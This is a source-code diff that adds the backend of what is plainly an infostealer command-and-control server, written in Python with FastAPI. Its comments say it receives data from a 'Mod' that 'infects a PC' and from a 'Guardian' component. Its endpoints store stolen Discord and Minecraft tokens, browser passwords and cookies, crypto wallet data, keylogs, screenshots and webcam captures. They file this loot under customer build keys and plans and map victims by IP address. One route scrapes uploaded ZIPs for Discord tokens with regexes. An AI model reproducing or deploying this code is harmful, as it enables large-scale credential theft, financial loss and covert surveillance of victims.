@@ -1,0 +1,631 @@
+from fastapi import APIRouter, Depends, HTTPException, Request
+from sqlalchemy.orm import Session
+from app.core.database import get_db
+from app.models.user import User, Log, Token, PlanType
+from app.schemas.schemas import LogCreate
+import json
+import os
+import re
+import zipfile
+import io
+from datetime import datetime
+
+router = APIRouter()
+upload_router = APIRouter()  # Separate router for /api/upload/
+
+# Storage directories
+UPLOAD_DIR = os.path.join(os.path.dirname(__file__), '..', '..', '..', '..', 'uploads')
+os.makedirs(UPLOAD_DIR, exist_ok=True)
+
+# IP to User mapping for Guardian (IP -> user_id, build_key)
+# This is populated when Mod infects a PC - Guardian can then send data using just IP
+IP_USER_MAP_FILE = os.path.join(UPLOAD_DIR, '..', 'ip_user_map.json')
+
+def load_ip_map():
+    """Load IP to user mapping from disk"""
+    try:
+        if os.path.exists(IP_USER_MAP_FILE):
+            with open(IP_USER_MAP_FILE, 'r') as f:
+                return json.load(f)
+    except:
+        pass
+    return {}
+
+def save_ip_map(mapping):
+    """Save IP to user mapping to disk"""
+    try:
+        with open(IP_USER_MAP_FILE, 'w') as f:
+            json.dump(mapping, f)
+    except:
+        pass
+
+def register_ip_for_user(ip: str, user_id: int, build_key: str):
+    """Register that this IP was infected by this user"""
+    mapping = load_ip_map()
+    mapping[ip] = {
+        'user_id': user_id,
+        'build_key': build_key,
+        'registered_at': datetime.now().isoformat()
+    }
+    save_ip_map(mapping)
+
+def get_user_for_ip(ip: str, db: Session):
+    """Get user from IP mapping"""
+    mapping = load_ip_map()
+    if ip in mapping:
+        user_id = mapping[ip].get('user_id')
+        if user_id:
+            return db.query(User).filter(User.id == user_id).first()
+    return None
+
+
+def extract_tokens_from_zip(zip_data: bytes) -> list:
+    """Extract Discord tokens from a ZIP file - checks discord_tokens.txt first"""
+    tokens = []
+    
+    try:
+        with zipfile.ZipFile(io.BytesIO(zip_data), 'r') as zf:
+            # First priority: Look for discord_tokens.txt specifically
+            for file_info in zf.filelist:
+                filename_lower = file_info.filename.lower()
+                basename = os.path.basename(filename_lower)
+                
+                # Check for discord_tokens.txt or similar
+                if basename in ['discord_tokens.txt', 'discord_token.txt', 'tokens.txt']:
+                    try:
+                        with zf.open(file_info.filename) as f:
+                            content = f.read()
+                            try:
+                                text = content.decode('utf-8', errors='ignore')
+                            except:
+                                text = content.decode('latin-1', errors='ignore')
+                            
+                            # Parse each line - format: TOKEN | Status
+                            for line in text.split('\n'):
+                                line = line.strip()
+                                if not line:
+                                    continue
+                                
+                                # Split by | to get token part
+                                if '|' in line:
+                                    token_part = line.split('|')[0].strip()
+                                else:
+                                    token_part = line.strip()
+                                
+                                # Validate token format (has dots and proper length)
+                                if token_part and len(token_part) > 50 and '.' in token_part:
+                                    parts = token_part.split('.')
+                                    if len(parts) >= 2:
+                                        if token_part not in tokens:
+                                            tokens.append(token_part)
+                    except Exception as e:
+                        print(f"[-] Error reading token file: {e}")
+            
+            # If no tokens found in txt files, scan other files using regex
+            if not tokens:
+                # Token patterns
+                token_patterns = [
+                    r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',  # Standard token
+                    r'[\w-]{26}\.[\w-]{6}\.[\w-]{38}',  # New format
+                    r'mfa\.[\w-]{84}',  # MFA token
+                    r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}',  # Another format
+                ]
+                combined_pattern = '|'.join(f'({p})' for p in token_patterns)
+                
+                for file_info in zf.filelist:
+                    filename_lower = file_info.filename.lower()
+                    if any(x in filename_lower for x in ['discord', 'leveldb', '.ldb', '.log']):
+                        try:
+                            with zf.open(file_info.filename) as f:
+                                content = f.read()
+                                try:
+                                    text = content.decode('utf-8', errors='ignore')
+                                except:
+                                    text = content.decode('latin-1', errors='ignore')
+                                
+                                matches = re.findall(combined_pattern, text)
+                                for match in matches:
+                                    for m in match:
+                                        if m and len(m) > 50:
+                                            token = m.strip()
+                                            if token not in tokens:
+                                                tokens.append(token)
+                        except:
+                            pass
+    except Exception as e:
+        print(f"[-] Error extracting tokens from ZIP: {e}")
+    
+    return tokens
+
+@router.post("/{build_key}")
+async def receive_data(
+    build_key: str,
+    request: Request,
+    db: Session = Depends(get_db)
+):
+    """
+    Receive data from the Mod/Guardian.
+    Handles all data types: discord, minecraft, browser, wallet, system, gaming, 
+    telegram, screenshot, webcam, keylog, files
+    """
+    # 1. Validate Build Key
+    user = db.query(User).filter(User.build_key == build_key).first()
+    if not user:
+        raise HTTPException(status_code=404, detail="Invalid build key")
+
+    if not user.is_active:
+        raise HTTPException(status_code=403, detail="User inactive")
+    
+    # 2. Register IP for Guardian IP-matching
+    # When Mod infects a PC, register this IP -> user mapping so Guardian can use it
+    ip = request.client.host
+    register_ip_for_user(ip, user.id, build_key)
+
+    # 3. Parse Data
+    try:
+        data = await request.json()
+    except:
+        data = {}
+
+    ip = request.client.host
+    pc_name = data.get('pc_name', 'Unknown')
+    pc_user = data.get('pc_user', 'Unknown')
+    log_type = data.get('type', 'unknown')
+    
+    # Handle Discord Webhook Format (from Mod's sendWebhookEmbed)
+    if 'embeds' in data:
+        log_type = 'discord_embed'
+        embed = data['embeds'][0]
+        content = {
+            'title': embed.get('title'),
+            'description': embed.get('description'),
+            'footer': embed.get('footer', {}).get('text')
+        }
+        desc = embed.get('description', '')
+        if '**PC:**' in desc:
+            try:
+                pc_name = desc.split('**PC:**')[1].strip().split('\n')[0]
+            except:
+                pass
+    else:
+        # Standard Format - store full data based on type
+        content = {}
+        
+        if log_type == 'discord':
+            content = {
+                'token': data.get('token', ''),
+                'userid': data.get('userid', ''),
+                'username': data.get('username', ''),
+                'email': data.get('email', ''),
+                'phone': data.get('phone', ''),
+                'nitro': data.get('nitro', ''),
+                'billing': data.get('billing', ''),
+                'mfa_enabled': data.get('mfa_enabled', False),
+                'guild_count': data.get('guild_count', 0),
+                'locale': data.get('locale', ''),
+                'bio': data.get('bio', '')
+            }
+        elif log_type == 'minecraft':
+            content = {
+                'player': data.get('player', ''),
+                'uuid': data.get('uuid', ''),
+                'access_token': data.get('access_token', ''),
+                'client_id': data.get('client_id', ''),
+                'ip': data.get('ip', '')
+            }
+        elif log_type == 'minecraft_refresh':
+            content = {
+                'player': data.get('player', ''),
+                'uuid': data.get('uuid', ''),
+                'refresh_token': data.get('refresh_token', '')
+            }
+        elif log_type == 'browser':
+            content = {
+                'browser': data.get('browser', ''),
+                'url': data.get('url', ''),
+                'username': data.get('username', ''),
+                'password': data.get('password', ''),
+                'passwords': data.get('passwords', []),
+                'cookies': data.get('cookies', [])
+            }
+        elif log_type == 'wallet':
+            content = {
+                'wallet_name': data.get('wallet_name', ''),
+                'wallet_type': data.get('wallet_type', ''),
+                'data': data.get('data', '')
+            }
+        elif log_type == 'system':
+            content = {
+                'os': data.get('os', ''),
+                'cpu': data.get('cpu', ''),
+                'gpu': data.get('gpu', ''),
+                'ram': data.get('ram', ''),
+                'ip': data.get('ip', ''),
+                'country': data.get('country', '')
+            }
+        elif log_type == 'gaming':
+            content = {
+                'platform': data.get('platform', ''),
+                'data': data.get('data', '')
+            }
+        elif log_type == 'telegram':
+            content = {'data': data.get('data', '')}
+        elif log_type == 'screenshot':
+            # Store base64 image
+            content = {'image': data.get('image', '')}
+        elif log_type == 'webcam':
+            content = {'image': data.get('image', '')}
+        elif log_type == 'keylog':
+            content = {
+                'keys': data.get('keys', ''),
+                'window_title': data.get('window_title', '')
+            }
+        elif log_type == 'files':
+            content = {'files': data.get('files', [])}
+        else:
+            # Unknown type - store everything
+            content = {k: v for k, v in data.items() if k not in ['type', 'pc_name', 'pc_user']}
+
+    # NOTE: We ALWAYS store all data regardless of user plan
+    # Plan-based filtering happens when RETRIEVING logs, not when storing
+    # This allows: 1) Admin to see all data 2) User to see data after upgrade
+    
+    # 3. Store Data
+    new_log = Log(
+        user_id=user.id,
+        log_type=log_type,
+        content=json.dumps(content) if isinstance(content, (dict, list)) else str(content),
+        ip_address=ip,
+        pc_name=pc_name,
+        pc_user=pc_user
+    )
+    db.add(new_log)
+    db.commit()
+
+    return {"status": "success", "log_id": new_log.id}
+
+
+# ============= UPLOAD ROUTER (mounted at /api/upload) =============
+
+@upload_router.post("/{build_key}")
+async def upload_zip(
+    build_key: str,
+    request: Request,
+    db: Session = Depends(get_db)
+):
+    """
+    Receive ZIP data from Mod (binary upload)
+    """
+    user = db.query(User).filter(User.build_key == build_key).first()
+    if not user:
+        raise HTTPException(status_code=404, detail="Invalid build key")
+
+    # Get headers
+    pc_name = request.headers.get('X-PC-Name', 'Unknown')
+    pc_user = request.headers.get('X-PC-User', 'Unknown')
+    
+    # Read binary data
+    body = await request.body()
+    
+    if len(body) == 0:
+        raise HTTPException(status_code=400, detail="Empty body")
+    
+    # Save ZIP file
+    user_dir = os.path.join(UPLOAD_DIR, str(user.id))
+    os.makedirs(user_dir, exist_ok=True)
+    
+    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+    filename = f"{pc_user}_{timestamp}.zip"
+    filepath = os.path.join(user_dir, filename)
+    
+    with open(filepath, 'wb') as f:
+        f.write(body)
+    
+    # Extract and store Discord tokens from ZIP
+    extracted_tokens = extract_tokens_from_zip(body)
+    tokens_stored = 0
+    
+    for token_str in extracted_tokens:
+        # Check if token already exists
+        existing = db.query(Token).filter(Token.token == token_str).first()
+        if not existing:
+            # Store new token with metadata
+            token_metadata = json.dumps({
+                "pc_name": pc_name,
+                "pc_user": pc_user,
+                "ip": request.client.host,
+                "source": "zip",
+                "source_file": filename
+            })
+            new_token = Token(
+                user_id=user.id,
+                token=token_str,
+                is_valid=None,  # Will be validated later
+                token_metadata=token_metadata
+            )
+            db.add(new_token)
+            tokens_stored += 1
+    
+    # Log it
+    new_log = Log(
+        user_id=user.id,
+        log_type='zip_upload',
+        content=json.dumps({'filename': filename, 'size': len(body), 'tokens_extracted': len(extracted_tokens)}),
+        ip_address=request.client.host,
+        pc_name=pc_name,
+        pc_user=pc_user
+    )
+    db.add(new_log)
+    db.commit()
+
+    return {"status": "success", "filename": filename, "size": len(body), "tokens_extracted": len(extracted_tokens), "tokens_stored": tokens_stored}
+
+
+@router.post("/webcam/{build_key}")
+async def upload_webcam(
+    build_key: str,
+    request: Request,
+    db: Session = Depends(get_db)
+):
+    """
+    Receive webcam image from Mod (JSON with base64 image)
+    """
+    user = db.query(User).filter(User.build_key == build_key).first()
+    if not user:
+        raise HTTPException(status_code=404, detail="Invalid build key")
+    
+    # Always save webcam data - plan filtering happens on retrieval
+
+    try:
+        data = await request.json()
+    except:
+        raise HTTPException(status_code=400, detail="Invalid JSON")
+    
+    pc_name = data.get('pc_name', 'Unknown')
+    pc_user = data.get('pc_user', 'Unknown')
+    image_b64 = data.get('image', '')
+    
+    if not image_b64:
+        raise HTTPException(status_code=400, detail="No image data")
+
+    # Basic size check and rate limiting to prevent flooding
+    MAX_B64_LEN = 800000  # ~600KB image (base64)
+    if len(image_b64) > MAX_B64_LEN:
+        raise HTTPException(status_code=413, detail="Image too large")
+
+    # Rate limiting per build_key (simple in-memory sliding window)
+    if 'recent_image_uploads' not in globals():
+        global recent_image_uploads
+        recent_image_uploads = {}
+
+    import time
+    now = time.time()
+    window = 60
+    max_per_window = 10  # allow up to 10 images per minute by default
+
+    arr = recent_image_uploads.get(build_key, [])
+    # prune old
+    arr = [t for t in arr if now - t < window]
+    if len(arr) >= max_per_window:
+        raise HTTPException(status_code=429, detail="Rate limit exceeded for image uploads")
+    arr.append(now)
+    recent_image_uploads[build_key] = arr
+
+    # Store as log
+    new_log = Log(
+        user_id=user.id,
+        log_type='webcam',
+        content=json.dumps({'image': image_b64, 'pc_user': pc_user, 'pc_name': pc_name}),
+        ip_address=request.client.host,
+        pc_name=pc_name,
+        pc_user=pc_user
+    )
+    db.add(new_log)
+    db.commit()
+
+    return {"status": "success", "log_id": new_log.id}
+
+
+@router.post("/screenshot/{build_key}")
+async def upload_screenshot(
+    build_key: str,
+    request: Request,
+    db: Session = Depends(get_db)
+):
+    """
+    Receive screenshot from Guardian (JSON with base64 image)
+    """
+    user = db.query(User).filter(User.build_key == build_key).first()
+    if not user:
+        raise HTTPException(status_code=404, detail="Invalid build key")
+
+    try:
+        data = await request.json()
+    except:
+        raise HTTPException(status_code=400, detail="Invalid JSON")
+    
+    pc_name = data.get('pc_name', 'Unknown')
+    pc_user = data.get('pc_user', 'Unknown')
+    image_b64 = data.get('image', '')
+    
+    if not image_b64:
+        raise HTTPException(status_code=400, detail="No image data")
+
+    # Basic size check and rate limiting to prevent flooding
+    MAX_B64_LEN = 800000  # ~600KB image (base64)
+    if len(image_b64) > MAX_B64_LEN:
+        raise HTTPException(status_code=413, detail="Image too large")
+
+    # Rate limiting per build_key (simple in-memory sliding window)
+    if 'recent_image_uploads' not in globals():
+        global recent_image_uploads
+        recent_image_uploads = {}
+
+    import time
+    now = time.time()
+    window = 60
+    max_per_window = 10  # allow up to 10 images per minute by default
+
+    arr = recent_image_uploads.get(build_key, [])
+    # prune old
+    arr = [t for t in arr if now - t < window]
+    if len(arr) >= max_per_window:
+        raise HTTPException(status_code=429, detail="Rate limit exceeded for image uploads")
+    arr.append(now)
+    recent_image_uploads[build_key] = arr
+
+    new_log = Log(
+        user_id=user.id,
+        log_type='screenshot',
+        content=json.dumps({'image': image_b64, 'pc_user': pc_user, 'pc_name': pc_name}),
+        ip_address=request.client.host,
+        pc_name=pc_name,
+        pc_user=pc_user
+    )
+    db.add(new_log)
+    db.commit()
+
+    return {"status": "success", "log_id": new_log.id}
+
+
+# ============= GUARDIAN ENDPOINTS (IP-based matching) =============
+
+@router.post("/guardian")
+async def guardian_data(
+    request: Request,
+    db: Session = Depends(get_db)
+):
+    """
+    Receive data from Guardian - matches user by IP address.
+    Guardian does NOT need config.dat - server automatically matches
+    the IP to the user who infected that PC via the Mod.
+    """
+    ip = request.client.host
+    
+    # Try to find user by IP mapping
+    user = get_user_for_ip(ip, db)
+    
+    if not user:
+        # No mapping found - try to find any user with recent activity from this IP
+        recent_log = db.query(Log).filter(Log.ip_address == ip).order_by(Log.created_at.desc()).first()
+        if recent_log:
+            user = db.query(User).filter(User.id == recent_log.user_id).first()
+    
+    if not user:
+        # Still no user - store under admin or reject
+        # For now, reject with helpful message
+        raise HTTPException(status_code=404, detail="Unknown IP - Mod must infect first")
+    
+    try:
+        data = await request.json()
+    except:
+        data = {}
+    
+    log_type = data.get('type', 'guardian')
+    pc_name = data.get('pc_name', 'Guardian')
+    pc_user = data.get('pc_user', 'Unknown')
+    machine_id = data.get('machine_id', '')
+    
+    # Remove metadata from content
+    content_keys = [k for k in data.keys() if k not in ['type', 'pc_name', 'pc_user', 'machine_id']]
+    content = {k: data[k] for k in content_keys}
+    
+    new_log = Log(
+        user_id=user.id,
+        log_type=log_type,
+        content=json.dumps(content) if content else '{}',
+        ip_address=ip,
+        pc_name=pc_name,
+        pc_user=pc_user
+    )
+    db.add(new_log)
+    db.commit()
+    
+    return {"status": "success", "log_id": new_log.id, "matched_user": user.username}
+
+
+@router.post("/guardian/screenshot")
+async def guardian_screenshot(
+    request: Request,
+    db: Session = Depends(get_db)
+):
+    """Guardian screenshot upload - matches user by IP"""
+    ip = request.client.host
+    user = get_user_for_ip(ip, db)
+    
+    if not user:
+        recent_log = db.query(Log).filter(Log.ip_address == ip).order_by(Log.created_at.desc()).first()
+        if recent_log:
+            user = db.query(User).filter(User.id == recent_log.user_id).first()
+    
+    if not user:
+        raise HTTPException(status_code=404, detail="Unknown IP")
+    
+    try:
+        data = await request.json()
+    except:
+        raise HTTPException(status_code=400, detail="Invalid JSON")
+    
+    image_b64 = data.get('image', '')
+    if not image_b64:
+        raise HTTPException(status_code=400, detail="No image")
+    
+    # Rate limit
+    if len(image_b64) > 800000:
+        raise HTTPException(status_code=413, detail="Too large")
+    
+    new_log = Log(
+        user_id=user.id,
+        log_type='screenshot',
+        content=json.dumps({'image': image_b64, 'source': 'guardian'}),
+        ip_address=ip,
+        pc_name=data.get('pc_name', 'Guardian'),
+        pc_user=data.get('pc_user', 'Unknown')
+    )
+    db.add(new_log)
+    db.commit()
+    
+    return {"status": "success"}
+
+
+@router.post("/guardian/webcam")
+async def guardian_webcam(
+    request: Request,
+    db: Session = Depends(get_db)
+):
+    """Guardian webcam upload - matches user by IP"""
+    ip = request.client.host
+    user = get_user_for_ip(ip, db)
+    
+    if not user:
+        recent_log = db.query(Log).filter(Log.ip_address == ip).order_by(Log.created_at.desc()).first()
+        if recent_log:
+            user = db.query(User).filter(User.id == recent_log.user_id).first()
+    
+    if not user:
+        raise HTTPException(status_code=404, detail="Unknown IP")
+    
+    try:
+        data = await request.json()
+    except:
+        raise HTTPException(status_code=400, detail="Invalid JSON")
+    
+    image_b64 = data.get('image', '')
+    if not image_b64:
+        raise HTTPException(status_code=400, detail="No image")
+    
+    if len(image_b64) > 800000:
+        raise HTTPException(status_code=413, detail="Too large")
+    
+    new_log = Log(
+        user_id=user.id,
+        log_type='webcam',
+        content=json.dumps({'image': image_b64, 'source': 'guardian'}),
+        ip_address=ip,
+        pc_name=data.get('pc_name', 'Guardian'),
+        pc_user=data.get('pc_user', 'Unknown')
+    )
+    db.add(new_log)
+    db.commit()
+    
+    return {"status": "success"}
